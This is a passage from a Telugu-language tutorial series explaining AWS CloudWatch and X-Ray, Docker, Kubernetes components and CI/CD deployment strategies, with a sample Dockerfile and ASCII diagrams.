మైక్రోసర్వీసెస్ వందల కొద్దీ ఉన్నప్పుడు సమస్య ఎక్కడ వచ్చిందో కనిపెట్టడం చాలా కష్టం. ఆ కష్టాన్ని తీర్చడానికి AWS అందించే రెండు మోస్ట్ పవర్‌ఫుల్ మానిటరింగ్ టూల్స్ **CloudWatch** మరియు **X-Ray**.

వీటిని కూడా మన స్టైల్‌లో క్లియర్‌గా, తెలుగులో నేర్చుకుందాం.

---

## 1. Amazon CloudWatch (సిస్టమ్ యొక్క కంటి చూపు)

**CloudWatch** అనేది AWS లోపల ఉండే ఒక కంప్లీట్ మానిటరింగ్ మరియు మేనేజ్‌మెంట్ లేయర్. మీ అప్లికేషన్ యొక్క ఆరోగ్యాన్ని (Health) ఇది మూడు ముఖ్యమైన రూపాల్లో ట్రాక్ చేస్తుంది: **Metrics, Logs, మరియు Alarms**.

### 📊 Metrics (అంకెలు/గ్రాఫ్‌లు)

- **What it is:** మీ సర్వర్ల పర్ఫార్మెన్స్ కి సంబంధించిన లైవ్ డేటా.
- **Example:** మీ EC2 సర్వర్ యొక్క CPU Utilization ఎంత ఉంది? మీ లాంబ్డా (Lambda) ఫంక్షన్ ఎన్నిసార్లు కాల్ అయింది? డేటాబేస్ లో ఎంత మెమరీ ఖాళీగా ఉంది? లాంటి విషయాలను గ్రాఫ్‌ల రూపంలో చూపిస్తుంది.

### 📝 Logs (డైరీ/రికార్డులు)

- **What it is:** మీ అప్లికేషన్ కోడ్ రన్ అవుతున్నప్పుడు జనరేట్ అయ్యే `console.log()` లేదా ఎర్రర్ మెసేజ్ లన్నింటినీ ఒకే చోట దాచే నిధి (**CloudWatch Logs**).
- **Why it's important:** ప్రొడక్షన్‌లో ఏదైనా ఏపీఐ (API) ఫెయిల్ అయినప్పుడు, మీరు సర్వర్ లోపలికి వెళ్ళకుండానే నేరుగా CloudWatch లో సెర్చ్ చేసి, "ఏ లైన్ లో బగ్ వచ్చింది" అనేది క్షణాల్లో కనిపెట్టవచ్చు.

### 🚨 Alarms & Actions (హెచ్చరికలు)

- **What it is:** ఒక నిర్దిష్టమైన కండిషన్ దాటినప్పుడు ఆటోమేటిక్‌గా అలర్ట్ చేయడం లేదా ఒక యాక్షన్ తీసుకోవడం.
- **Example:** "ఒకవేళ సర్వర్ CPU లోడ్ 85% దాటితే, వెంటనే టీమ్ గ్రూప్‌కి ఒక ఈమెయిల్/Slack నోటిఫికేషన్ పంపు" అని అలారమ్ సెట్ చేయవచ్చు. అలాగే **Auto-Scaling** ని ట్రిగర్ చేసి, ఆటోమేటిక్‌గా ఇంకో కొత్త సర్వీస్ సర్వర్‌ని యాడ్ చేసేలా కూడా దీనితో లింక్ చేయవచ్చు.

---

## 2. AWS X-Ray (సిస్టమ్ యొక్క ఎక్స్-రే స్కాన్)

CloudWatch మీకు లాగ్స్ మరియు గ్రాఫ్స్ ఇస్తుంది, కానీ మైక్రోసర్వీసెస్ ఆర్కిటెక్చర్‌లో అది సరిపోదు.

- **The Problem:** ఒక యూజర్ మొబైల్ యాప్‌లో "Buy" కొట్టాడు. ఆ రిక్వెస్ట్ `API Gateway` కి వెళ్లి ──► అక్కడ నుండి `Order-Service` కి వెళ్లి ──► అక్కడ నుండి `Payment-Service` కి వెళ్లి ──► చివరకు `DynamoDB` కి వెళ్లింది. పొరపాటున ఈ ప్రాసెస్ లో పేమెంట్ సర్వీస్ స్లో అయి, యూజర్‌కి స్క్రీన్ లోడింగ్ పడింది. ఇప్పుడు సమస్య ఎక్కడ ఉందో క్లౌడ్‌వాచ్ లాగ్స్ లో విడివిడిగా వెతకడం చాలా నరకం.
- **The Solution (Distributed Tracing):** ఇక్కడే **AWS X-Ray** ఎంటర్ అవుతుంది. ఇది మీ అప్లికేషన్ లోపల ఒక ఎక్స్-రే స్కాన్ లాగా పనిచేస్తుంది.

```text
 [Client] ──► [API Gateway] ──► [Order Service] ──► [Payment Service] ──► [DynamoDB]
               └─────────────────────── X-Ray Trace ID ────────────────────────┘
                 (Total: 2.5s)      (50ms)            (2.3s - SLOW!)       (10ms)

```

### 🛠️ ఇది ఎలా పనిచేస్తుంది?

1. **Trace ID:** రిక్వెస్ట్ క్లయింట్ నుండి రాగానే, X-Ray దానికి ఒక యూనిక్ తాళం గుర్తు లాంటి **`Trace ID`** ని అటాచ్ చేస్తుంది. ఆ రిక్వెస్ట్ వంద సర్వీసెస్ దాటి వెళ్లినా, ఆ ఐడీ దాని వెంటే ఉంటుంది.
2. **Service Map:** మీ కళ్ళ ముందే ఒక విజువల్ మ్యాప్ (Graph) ని క్రియేట్ చేస్తుంది. ఏ సర్వీస్ ఏ సర్వీస్ ని కాల్ చేసింది, ఎక్కడ ఎంత సమయం (Latency) పట్టింది, ఏ సర్వీస్ లో `500 Internal Server Error` వచ్చింది అనేది కలర్ కోడింగ్ (గ్రీన్ ఐతే సక్సెస్, రెడ్ ఐతే ఎర్రర్) తో స్పష్టంగా చూపిస్తుంది.
3. **Deep Bottleneck Analysis:** "పేమెంట్ సర్వీస్ లోపల ఒక నిర్దిష్టమైన SQL క్వెరీ రన్ అవ్వడానికి 2 సెకన్లు పట్టింది" అనే లెవెల్ వరకు డీప్ గా రూట్-కాజ్ (Root Cause) ని ఇది బయటపెడుతుంది.

---

### 📌 క్విక్ సమ్మరీ (తేడా ఏంటి?):

- **CloudWatch:** ఒక నిర్దిష్టమైన సర్వర్ లేదా సర్వీస్ యొక్క హెల్త్, సిపియూ మెట్రిక్స్ మరియు రాసిన కోడ్ యొక్క లాగ్స్ చూడటానికి వాడే **Infrastructure Monitoring** టూల్.
- **X-Ray:** మల్టిపుల్ మైక్రోసర్వీసెస్ మధ్య రిక్వెస్ట్ ఎలా ప్రయాణిస్తుందో లైవ్ గా ట్రాక్ చేసి, లాటెన్సీ ఎక్కడ ఉందో కనిపెట్టే **Distributed Tracing** టూల్.

---

# 10: Containers

బ్యాకెండ్ మరియు డెవలప్‌మెంట్ ప్రపంచంలో **Containers** మరియు **Docker** అనేవి గేమ్ ఛేంజర్స్.

- **The Ancient Problem:** "నా లాప్‌టాప్‌లో కోడ్ పక్కాగా పనిచేస్తోంది, కానీ ప్రొడక్షన్ సర్వర్‌లో రన్ అవ్వట్లేదు (It works on my machine)" అనే డైలాగ్ డెవలపర్లు తరచూ చెప్తుంటారు. ఎందుకంటే డెవలపర్ వాడే Node.js/Python వెర్షన్ వేరు, ప్రొడక్షన్ సర్వర్ లోని వెర్షన్ వేరు ఉండొచ్చు, లేదా కొన్ని డిపెండెన్సీలు మిస్ అవ్వచ్చు.
- **The Solution (Docker):** మీ కోడ్, దానికి కావలసిన లైబ్రరీలు, ఓఎస్ ఫైల్స్, వెర్షన్లు అన్నింటినీ కలిపి ఒకే ఒక చిన్న బాక్స్ (Container) లాగా ప్యాక్ చేయడం. దీనివల్ల ఆ బాక్స్‌ని ప్రపంచంలో ఏ కంప్యూటర్‌లో రన్ చేసినా ఒకేలా, పక్కాగా రన్ అవుతుంది.

ఈ కంటైనరైజేషన్ ప్రపంచాన్ని మన స్టైల్‌లో క్లియర్‌గా, తెలుగులో నేర్చుకుందాం.

---

## 1. Core Concepts (ముఖ్యమైన పునాదులు)

డాకర్‌లో మనం తరచూ వాడే రెండు ప్రధాన పదాల మధ్య తేడా ఏంటో మొదట చూద్దాం:

- **Docker Image (బ్లూప్రింట్):** ఇది మీ అప్లికేషన్‌కు సంబంధించిన ఒక రీడ్-ఓన్లీ టెంప్లేట్ (Read-only Template). ఇందులో మీ కోడ్, రన్-టైమ్ (ఉదా: Node.js), ఎన్విరాన్‌మెంట్ వేరియబుల్స్ అన్నీ ప్యాక్ అయి ఉంటాయి. దీన్ని ఇల్లు కట్టడానికి వాడే ఒక **"ప్లాన్ లేదా బ్లూప్రింట్"** అనుకోవచ్చు.
- **Docker Container (లైవ్ ఇన్‌స్టాన్స్):** ఆ ఇమేజ్ (బ్లూప్రింట్) ని రన్ చేస్తే వచ్చే ఒక ఐసోలేటెడ్ ప్రొసెస్ (Isolated Process) నే కంటైనర్ అంటారు. ఇది మనం ప్లాన్ చూసి కట్టిన **"నిజమైన ఇల్లు"** లాంటిది. ఒకే ఇమేజ్ నుండి మీరు వందల కంటైనర్లను క్షణాల్లో క్రియేట్ చేయవచ్చు.

---

## 2. Docker Tools & Configs (కంటైనర్ బిల్డింగ్ బ్లాక్స్)

### 📄 Dockerfile (రెసిపీ బుక్)

- **What it is:** మీ అప్లికేషన్‌ను ఒక డాకర్ ఇమేజ్‌గా ఎలా మార్చాలో స్టెప్-బై-స్టెప్ రాసే ఒక సింపుల్ టెక్స్ట్ ఫైల్.
- **Example Structure:**

```dockerfile
FROM node:18-alpine         # 1. బేస్ ఇమేజ్ ఎంచుకో
WORKDIR /app                # 2. వర్కింగ్ డైరెక్టరీ సెట్ చెయ్
COPY package*.json ./       # 3. డిపెండెన్సీ ఫైల్స్ కాపీ చెయ్
RUN npm install             # 4. లైబ్రరీలను ఇన్‌స్టాల్ చెయ్
COPY . .                    # 5. మిగతా కోడ్ అంతా కాపీ చెయ్
EXPOSE 5000                 # 6. పోర్ట్ ఓపెన్ చెయ్
CMD ["node", "server.js"]   # 7. యాప్‌ని స్టార్ట్ చేసే కమాండ్

```

### 🎼 Docker Compose (మల్టిపుల్ కంటైనర్ల మేనేజర్)

- **What it is:** మీ అప్లికేషన్‌లో కేవలం బ్యాకెండ్ మాత్రమే కాదు, ఒక Redis క్యాషే, ఒక PostgreSQL డేటాబేస్ కూడా ఉన్నాయి అనుకుందాం. వీటన్నింటినీ విడివిడిగా మూడు కమాండ్స్ ఇచ్చి రన్ చేయడం కష్టం.
- **The Solution:** ఒకే ఒక `docker-compose.yml` ఫైల్ లోపల ఈ మూడు సర్వీసెస్ కాన్ఫిగరేషన్ రాసి, **`docker-compose up`** అని ఒక్క కమాండ్ కొడితే చాలు—ఆ మూడూ ఒకదానితో ఒకటి కనెక్ట్ అయి ఒకేసారి స్టార్ట్ అవుతాయి.

---

## 3. Storage & Networking (డేటా మరియు కమ్యూనికేషన్)

డాకర్ కంటైనర్లు బేసిక్‌గా **Ephemeral** (తాత్కాలికమైనవి). అంటే కంటైనర్ డిలీట్ అయితే లోపల ఉన్న డేటా మొత్తం పోతుంది. మరి డేటాని ఎలా దాచాలి, సర్వీసెస్ ఎలా మాట్లాడుకోవాలి?

### 💾 Docker Volumes (శాశ్వత స్టోరేజ్)

- **What it is:** కంటైనర్ బయట (మీ హోస్ట్ కంప్యూటర్ హార్డ్ డిస్క్‌లో) ఒక ఫోల్డర్‌ని క్రియేట్ చేసి, దాన్ని కంటైనర్ లోపల ఉన్న ఫోల్డర్‌కి లింక్ (Mount) చేయడం.
- **Why it's necessary:** ఒకవేళ మీ డేటాబేస్ కంటైనర్ క్రాష్ అయి డిలీట్ అయినా సరే, మీ డేటా మొత్తం ఈ వాల్యూమ్ (Volume) లో భద్రంగా ఉంటుంది. కొత్త కంటైనర్ వచ్చినప్పుడు మళ్ళీ దీనికి కనెక్ట్ చేయవచ్చు.

### 🌐 Docker Networks (ఇంటర్నల్ వైఫై)

- **What it is:** కంటైనర్లు ఒకదానితో ఒకటి మాట్లాడుకోవడానికి డాకర్ క్రియేట్ చేసే ఒక వర్చువల్ నెట్‌వర్క్.
- **Benefit:** మీ `Node.js` కంటైనర్ మీ `MongoDB` కంటైనర్‌తో మాట్లాడాలి అంటే, దాని ఐపీ అడ్రస్ వెతకక్కర్లేదు. నెట్‌వర్క్ లోపల డైరెక్ట్‌గా ఆ కంటైనర్ పేరు (ఉదా: `mongodb://database-container:27017`) వాడి కనెక్ట్ అయిపోవచ్చు. బయటి ప్రపంచానికి ఈ డేటాబేస్ పోర్ట్ అసలు కనిపించదు, కాబట్టి చాలా సేఫ్.

---

## 4. Multi-stage Build (ప్రొఫెషనల్ ఆప్టిమైజేషన్)

- **The Problem:** ఒక React లేదా TypeScript యాప్‌ని బిల్డ్ చేసేటప్పుడు మనకు చాలా లైబ్రరీలు (`devDependencies`), కంపైలర్లు అవసరం అవుతాయి. వాటన్నింటినీ అలాగే ఇమేజ్ లో ఉంచేస్తే, ఇమేజ్ సైజ్ 1 GB దాటిపోతుంది. సైజ్ ఎక్కువైతే క్లౌడ్‌లో డెప్లాయ్ చేయడం చాలా స్లో అవుతుంది.
- **The Solution (Multi-stage Build):** మీ `Dockerfile` లోపల మల్టిపుల్ స్టేజెస్ (రౌండ్స్) వాడటం.
- **Stage 1 (Build Stage):** పెద్ద బేస్ ఇమేజ్ తీసుకుని, కోడ్‌ని కంపైల్ చేసి, ప్రొడక్షన్ ఫైల్స్ (`dist/` లేదా `build/` ఫోల్డర్) జనరేట్ చేయడం.
- **Stage 2 (Production Stage):** ఒక చిన్న అల్ట్రా-లైట్ ఇమేజ్ (ఉదా: `nginx:alpine`) తీసుకుని, ఫస్ట్ స్టేజ్ లో తయారైన ఆ ఫైనల్ ఫైల్స్ ని మాత్రమే ఇందులోకి కాపీ చేసుకోవడం. పాత కంపైలర్లు, జంక్ ఫైల్స్ అన్నింటినీ అక్కడే వదిలేయడం.

- **Result:** మీ ఇమేజ్ సైజ్ 1 GB నుండి కేవలం **50 MB** కి పడిపోతుంది! సూపర్ ఫాస్ట్ డెప్లాయ్‌మెంట్స్ జరుగుతాయి.

---

డాకర్ (Docker) ద్వారా కంటైనర్లు ఎలా క్రియేట్ చేయాలో నేర్చుకున్నాం. కానీ ప్రొడక్షన్‌లో వందలాది కంటైనర్లను మేనేజ్ చేయడం, ఒక కంటైనర్ క్రాష్ అయితే వెంటనే ఇంకోదాన్ని స్టార్ట్ చేయడం, ట్రాఫిక్ పెరిగితే ఆటోమేటిక్‌గా స్కేల్ చేయడం మానవీయంగా సాధ్యం కాదు. ఇక్కడే కంటైనర్ ఆర్కెస్ట్రేషన్ కింగ్ **Kubernetes (K8s)** ఎంటర్ అవుతుంది.

కుబెర్నెటిస్ లోని కోర్ కాంపోనెంట్స్ మరియు కాన్సెప్ట్స్‌ని మన స్టైల్‌లో క్లియర్‌గా, తెలుగులో నేర్చుకుందాం.

---

## 1. Compute & Workloads (కంటైనర్లు ఎలా రన్ అవుతాయి?)

కుబెర్నెటిస్ లో కంటైనర్లను నేరుగా రన్ చేయము. వాటి చుట్టూ కొన్ని లేయర్స్ ఉంటాయి:

- **Pods (అతి చిన్న యూనిట్):** కుబెర్నెటిస్‌లో అత్యంత ప్రాథమికమైన బిల్డింగ్ బ్లాక్. ఒక పాడ్ లోపల ఒకటి లేదా అంతకంటే ఎక్కువ డాకర్ కంటైనర్లు రన్ అవుతాయి. సాధారణంగా ఒక పాడ్ = ఒక అప్లికేషన్ ఇన్‌స్టాన్స్. పాడ్‌లు తాత్కాలికమైనవి (Ephemeral) — ఎప్పుడు కావాలంటే అప్పుడు డిలీట్ అయి కొత్తవి వస్తుంటాయి.
- **ReplicaSet (కాపీల సంరక్షకుడు):** మీ అప్లికేషన్ ఎల్లప్పుడూ నిర్ణీత సంఖ్యలో (ఉదాహరణకు 3 కాపీలు) రన్ అవుతూ ఉండేలా చూసే బాధ్యత దీనిదే. ఒక పాడ్ క్రాష్ అయితే, రెప్లికాసెట్ వెంటనే ఇంకో కొత్త పాడ్‌ని క్రియేట్ చేస్తుంది.
- **Deployment (రాజు):** రియల్ వరల్డ్ లో మనం డైరెక్ట్‌గా పాడ్స్ లేదా రెప్లికాసెట్స్ క్రియేట్ చేయం. కేవలం `Deployment` ని కాన్ఫిగర్ చేస్తాం. ఇది రెప్లికాసెట్‌ను మేనేజ్ చేస్తూ, మీ కోడ్‌ను జీరో-డౌన్‌టైమ్ (Zero-downtime / Rolling Update) తో కొత్త వెర్షన్‌కి అప్‌గ్రేడ్ చేయడానికి ఉపయోగపడుతుంది.

### 🛠️ Special Workloads (ప్రత్యేక అవసరాల కోసం)

- **StatefulSet:** సాధారణ పాడ్‌లకి స్థిరమైన గుర్తింపు (Identity) లేదా పర్మనెంట్ స్టోరేజ్ ఉండదు. కానీ **PostgreSQL, MongoDB, లేదా Redis** లాంటి డేటాబేస్‌లను రన్ చేయాలంటే, వాటికి ఒక పర్మనెంట్ పేరు, స్థిరమైన డిస్క్ కావాలి. అలాంటి "State" ని మెయింటైన్ చేసే కాంప్లెక్స్ అప్లికేషన్స్ కోసం `StatefulSet` వాడతాం.
- **DaemonSet:** మీ క్లస్టర్‌లో ఎన్ని కంప్యూటర్లు (Nodes) ఉంటే, ప్రతీ ఒక్క కంప్యూటర్‌లోనూ కచ్చితంగా ఒక పాడ్ రన్ అవ్వాలి అనుకుంటే ఇది వాడతాం. _ఉదాహరణ:_ ప్రతీ నోడ్ లోని లాగ్స్ కలెక్ట్ చేయడానికి ఉపయోగించే Log Forwarders (Fluentd) లేదా Monitoring Agents.

---

## 2. Networking & Routing (ట్రాఫిక్ మేనేజ్‌మెంట్)

పాడ్‌ల ఐపీ అడ్రస్‌లు నిరంతరం మారిపోతుంటాయి. మరి బయటి యూజర్లు లేదా ఇంటర్నల్ మైక్రోసర్వీసెస్ వాటిని ఎలా కనెక్ట్ అవ్వాలి?

- **Service (స్థిరమైన అడ్రస్ / లోడ్ బాలెన్సర్):** ఇది పాడ్‌ల గ్రూప్‌కి ముందు ఒక స్థిరమైన ఐపీ మరియు డిఎన్ఎస్ (DNS) ని ఇస్తుంది. వెనుక ఎన్ని పాడ్‌లు చనిపోయి కొత్తవి వచ్చినా, ఈ సర్వీస్ ఐపీ మారదు. ఇది ట్రాఫిక్‌ను పాడ్‌లకి లోడ్ బాలెన్స్ కూడా చేస్తుంది.
- _ClusterIP:_ కేవలం ఇంటర్నల్ మైక్రోసర్వీసెస్ మాట్లాడుకోవడానికి.
- _NodePort / LoadBalancer:_ బయటి ప్రపంచానికి అప్లికేషన్‌ను ఎక్స్‌పోజ్ చేయడానికి.

- **Ingress (స్మార్ట్ గేట్‌వే):** ఇది మీ క్లస్టర్ వాకిలి దగ్గర కూర్చునే ఒక మేనేజర్ (ఉదా: Nginx Ingress Controller). బయట నుండి వచ్చే రిక్వెస్ట్‌ల URL ని బట్టి (`/api` అయితే బ్యాకెండ్ సర్వీస్‌కి, `/` అయితే ఫ్రంటెండ్ సర్వీస్‌కి) స్మార్ట్ రూటింగ్ మరియు SSL/TLS సర్టిఫికేట్స్ మేనేజ్ చేయడం దీని పని.

---

## 3. Configuration & Secrets (కాన్ఫిగరేషన్స్ దాచడం)

కోడ్ లోపల ఎన్విరాన్‌మెంట్ వేరియబుల్స్ హార్డ్‌కోడ్ చేయకుండా ఉండటానికి ఇవి వాడతాం:

- **ConfigMap:** మీ అప్లికేషన్‌కు కావలసిన నార్మల్ కాన్ఫిగరేషన్స్ (ఉదాహరణకు: `PORT=5000`, `LOG_LEVEL=debug`) ని కీ-వాల్యూ జంటలుగా దాచడానికి ఇది వాడతాం.
- **Secret:** పాస్‌వర్డ్‌లు, డేటాబేస్ కనెక్షన్ స్ట్రింగ్స్, API కీస్ లాంటి అత్యంత రహస్యమైన డేటాని బేస్64 (Base64) ఎన్‌కోడ్ చేసి సురక్షితంగా దాచడానికి ఇది వాడతాం.

---

## 4. Advanced Management (స్కేలింగ్ మరియు ప్యాకేజింగ్)

- **Autoscaling (HPA - Horizontal Pod Autoscaler):** మీ అప్లికేషన్‌పై ట్రాఫిక్ విపరీతంగా పెరిగి, పాడ్ CPU లోడ్ 80% దాటితే... కుబెర్నెటిస్ ఆటోమేటిక్‌గా మీ అప్లికేషన్ పాడ్‌లను 3 నుండి 10 కి పెంచుతుంది. ట్రాఫిక్ తగ్గిపోయాక మళ్ళీ నిమ్మదిగా తగ్గించేస్తుంది.
- **Helm (కుబెర్నెటిస్ యొక్క App Store / NPM):** కుబెర్నెటిస్‌లో ఒక చిన్న అప్లికేషన్ రన్ చేయాలన్నా Deployment, Service, Ingress, ConfigMap అంటూ చాలా YAML ఫైల్స్ రాయాలి.
- **The Upgrade:** హెల్మ్ అనేది ఒక ప్యాకేజ్ మేనేజర్. ఇది ఈ YAML ఫైల్స్ అన్నింటినీ కలిపి ఒకే ఒక **"Helm Chart"** లాగా ప్యాక్ చేస్తుంది. మనం కేవలం `helm install my-app ./chart` అని ఒక్క కమాండ్ కొడితే మొత్తం అప్లికేషన్ సెటప్ అయిపోతుంది.

---

### 📌 ఒక్క ముక్కలో కుబెర్నెటిస్ ఫ్లో:

మీరు **Helm** ద్వారా అప్లికేషన్‌ను క్లస్టర్‌లో వేయగానే, **Deployment** రంగంలోకి దిగి **ReplicaSet** ద్వారా **Pods** ని క్రియేట్ చేస్తుంది. వాటికి **ConfigMap/Secret** నుండి ఎన్విరాన్‌మెంట్ వేరియబుల్స్ అందుతాయి. బయటి నుండి వచ్చే ట్రాఫిక్ ని **Ingress** రిసీవ్ చేసుకుని, **Service** ద్వారా ఆ పాడ్‌లకి పంపుతుంది. లోడ్ ఎక్కువైతే **Autoscaler** పాడ్‌ల సంఖ్యను పెంచుతుంది.

---

# 11: CI/CD

సాఫ్ట్‌వేర్ ఇంజనీరింగ్‌లో కోడ్ రాయడం ఎంత ముఖ్యమో, రాసిన కోడ్‌ను అంతే సురక్షితంగా, ఆటోమేటిక్‌గా టెస్ట్ చేసి ప్రొడక్షన్ సర్వర్లలోకి పంపడం (Deploy చేయడం) అంతకంటే ముఖ్యం. దీనినే **CI/CD (Continuous Integration / Continuous Deployment)** అంటారు.

- **The Old Way (పాత పద్ధతి):** డెవలపర్ కోడ్ రాసి, దాన్ని మ్యాన్యువల్ గా బిల్డ్ చేసి, పెండ్రైవ్ లోనో లేదా FTP ద్వారానో సర్వర్‌లోకి లాగిన్ అయి పేస్ట్ చేసేవాడు. ఈ ప్రాసెస్‌లో చాలా తప్పులు జరిగేవి, సైట్ డౌన్ అయ్యేది.
- **The Modern Way (CI/CD):** డెవలపర్ గిట్‌లో కోడ్‌ను పుష్ చేయగానే, బ్యాక్‌గ్రౌండ్‌లో రోబోలు రంగంలోకి దిగి కోడ్‌ను టెస్ట్ చేసి, డాకర్ ఇమేజ్ బిల్డ్ చేసి, సర్వర్‌లో ఆటోమేటిక్‌గా అప్‌డేట్ చేస్తాయి. యూజర్‌కి అసలు సైట్ ఆగిపోయినట్లే తెలియదు.

ఈ ఆటోమేషన్ ప్రపంచాన్ని మన స్టైల్‌లో క్లియర్‌గా, తెలుగులో నేర్చుకుందాం.

---

## 1. CI/CD Tools (ఆటోమేషన్ రథాలు)

కోడ్ మేనేజ్‌మెంట్ మరియు పైప్‌లైన్స్ రన్ చేయడానికి ఇండస్ట్రీలో మోస్ట్ పాపులర్ టూల్స్ ఇవి:

- **Git & GitHub/GitLab:** ఇది అందరికీ తెలిసిందే. డెవలపర్లు తమ కోడ్‌ను భద్రపరచడానికి, వెర్షన్లను ట్రాక్ చేయడానికి వాడే కోర్ టూల్.
- **GitHub Actions / GitLab CI / CircleCI:** ఇవి ఆధునిక క్లౌడ్-నేటివ్ టూల్స్. మీ GitHub రిపోజిటరీ లోపలే `.github/workflows/ci.yml` అనే చిన్న ఫైల్ రాసి, "కోడ్ పుష్ అవ్వగానే టెస్ట్‌లు రన్ చేయి, ఇమేజ్ బిల్డ్ చేయి" అని ఆటోమేట్ చేయవచ్చు. వీటికి విడిగా సర్వర్లు మెయింటైన్ చేయక్కర్లేదు.
- **Jenkins (ది లెజెండ్):** ఇది ఇండస్ట్రీలో దశాబ్దాలుగా ఉన్న అత్యంత పాత మరియు పవర్‌ఫుల్ ఓపెన్ సోర్స్ ఆటోమేషన్ టూల్. దీనికి వేల కొద్దీ ప్లగిన్లు ఉన్నాయి. పెద్ద పెద్ద ఎంటర్‌ప్రైజ్ కంపెనీలు తమ సొంత సర్వర్లలో జెంకిన్స్ ని సెటప్ చేసుకుని కాంప్లెక్స్ పైప్‌లైన్స్ రన్ చేస్తాయి.

---

## 2. GitOps & Continuous Delivery

- **ArgoCD (The GitOps King):** కుబెర్నెటిస్ (Kubernetes) ప్రపంచంలో ఇదొక అద్భుతమైన టూల్.
- _How it works:_ సాధారణంగా CI/CD పైప్‌లైన్ సర్వర్‌లోకి వెళ్లి ఫోర్స్ గా అప్‌డేట్ చేస్తుంది (Push Model). కానీ ArgoCD అలా కాదు, ఇది కుబెర్నెటిస్ క్లస్టర్ లోపల కూర్చుని నిరంతరం మీ గిట్ రిపోజిటరీని గమనిస్తూ ఉంటుంది (Pull Model).
- గిట్‌లో మీరు YAML ఫైల్‌లో చిన్న మార్పు చేయగానే, ArgoCD దాన్ని గుర్తించి క్లస్టర్ లోపల ఉన్న అప్లికేషన్‌ను ఆటోమేటిక్‌గా గిట్ స్టేట్‌కి సింక్ చేస్తుంది. **Gitis the single source of truth!**

---

## 3. Deployment Strategies (ప్రొడక్షన్‌లో కోడ్ ఎలా అప్‌డేట్ అవ్వాలి?)

కొత్త వెర్షన్ కోడ్‌ను (ఉదా: v1 నుండి v2 కి) ప్రొడక్షన్ సర్వర్‌లోకి పంపేటప్పుడు యూజర్లకి ఎలాంటి ఇబ్బంది (Downtime) కలగకుండా ఉండటానికి వేర్వేరు స్ట్రాటజీలు వాడుతాం:

### 🔄 1. Rolling Deployment (నిమ్మదిగా మార్చడం)

- **What it is:** మీ దగ్గర 4 సర్వర్లు పాత వెర్షన్ (v1) తో రన్ అవుతున్నాయి అనుకుందాం. ఒకేసారి నాలుగింటినీ అప్‌డేట్ చేయకుండా, మొదట సర్వర్-1 ని ఆపి అందులో v2 వేస్తుంది. అది సక్సెస్ అయ్యాక సర్వర్-2 లో v2 వేస్తుంది... అలా ఒకదాని తర్వాత ఒకటి అప్‌డేట్ అవుతాయి.
- **Pros:** సిస్టమ్ ఎక్కడా ఆగదు (Zero Downtime). కుబెర్నెటిస్‌లో ఇదే డిఫాల్ట్ స్ట్రాటజీ.
- **Cons:** అప్‌డేట్ జరిగే సమయంలో కొంతమంది యూజర్లకి v1, కొంతమందికి v2 కనిపిస్తుంది. ఒకవేళ v2 లో బగ్ ఉంటే, దాన్ని రోల్‌బ్యాక్ (వెనక్కి తిప్పడం) చేయడం కొంచెం స్లో అవుతుంది.

### 🔵🟢 2. Blue-Green Deployment (రెండు ప్రపంచాలు)

- **What it is:** ఇక్కడ మనం రెండు పూర్తి సమానమైన ఎన్విరాన్‌మెంట్లను మెయింటైన్ చేస్తాం.
- **Blue:** ప్రస్తుతం లైవ్ ట్రాఫిక్ నడుస్తున్న పాత వెర్షన్ (v1).
- **Green:** మనం కొత్తగా బిల్డ్ చేసిన సరికొత్త వెర్షన్ (v2).

- **How it works:** కొత్త కోడ్ అంతా గ్రీన్ ఎన్విరాన్‌మెంట్‌లో వేసి అన్ని టెస్ట్‌లు పూర్తి చేస్తాం. అంతా బాగుంది అనుకున్న మరుసటి సెకనులో, **Load Balancer** ని బ్లూ నుండి గ్రీన్ వైపు తిప్పుతాం. ట్రాఫిక్ అంతా క్షణంలో v2 కి వెళ్ళిపోతుంది.
- **Pros:** అత్యంత సురక్షితం. ఒకవేళ కొత్త వెర్షన్‌లో బగ్ వస్తే, లోడ్ బాలెన్సర్‌ని మళ్ళీ బ్లూ వైపు తిప్పితే చాలు (Instant Rollback).
- **Cons:** డబుల్ ఇన్ఫ్రాస్ట్రక్చర్ వాడటం వల్ల ఖర్చు (Cost) ఎక్కువ.

```text
                  ┌─────────────────┐
                  │  Load Balancer  │
                  └────────┬────────┘
                           │
            ┌──────────────┴──────────────┐
            ▼ (Switch Traffic instantly)  ▼
     ┌─────────────┐               ┌─────────────┐
     │  Blue (v1)  │               │  Green (v2) │
     │  [Active]   │               │  [Testing]  │
     └─────────────┘               └─────────────┘

```

### 🦜 3. Canary Deployment (కొద్దిమందిపై ప్రయోగం)

- **What it is:** పూర్వ కాలంలో గనుల్లోకి (Mines) వెళ్ళే కార్మికులు లోపల విషవాయువులు ఉన్నాయో లేదో తెలుసుకోవడానికి మొదట ఒక కానరీ పక్షిని (Canary bird) లోపలికి పంపేవారు. సాఫ్ట్‌വേర్‌లో కూడా అంతే.
- **How it works:** కొత్త వెర్షన్ (v2) ని డైరెక్ట్‌గా అందరికీ రిలీజ్ చేయకుండా, కేవలం 5% ట్రాఫిక్‌ను మాత్రమే v2 సర్వర్‌కి మళ్లిస్తారు. మిగతా 95% మంది పాత v1 నే వాడుతుంటారు. ఆ 5% యూజర్లకి ఎలాంటి ఎర్రర్స్ రాలేదు, అంతా సేఫ్ అని **CloudWatch/X-Ray** లో కన్ఫర్మ్ చేసుకున్నాక, నిమ్మదిగా ట్రాఫిక్‌ను 20%, 50%, చివరకు 100% కి పెంచుతారు.
- **Pros:** ఏదైనా బగ్ ఉంటే కేవలం 5% మందికి మాత్రమే ఎఫెక్ట్ అవుతుంది, మిగతా బిజినెస్ అంతా సేఫ్. రిస్క్ మేనేజ్‌మెంట్ కి ఇది బెస్ట్ స్ట్రాటజీ.

---

### 📌 క్విక్ సమ్మరీ (తేడా ఏంటి?):

- **Rolling:** ఒకదాని తర్వాత ఒకటి నిమ్మదిగా అప్‌డేట్ చేయడం.
- **Blue-Green:** పక్కనే కొత్త సిస్టమ్ రెడీ చేసి, ట్రాఫిక్‌ను ఒకేసారి 100% షిఫ్ట్ చేయడం.
- **Canary:** కొత్త వెర్షన్‌ని మొదట కేవలం 5% ట్రాఫిక్‌తో టెస్ట్ చేసి, ఆ తర్వాతే అందరికీ పెంచడం.

---

# 12: Observability

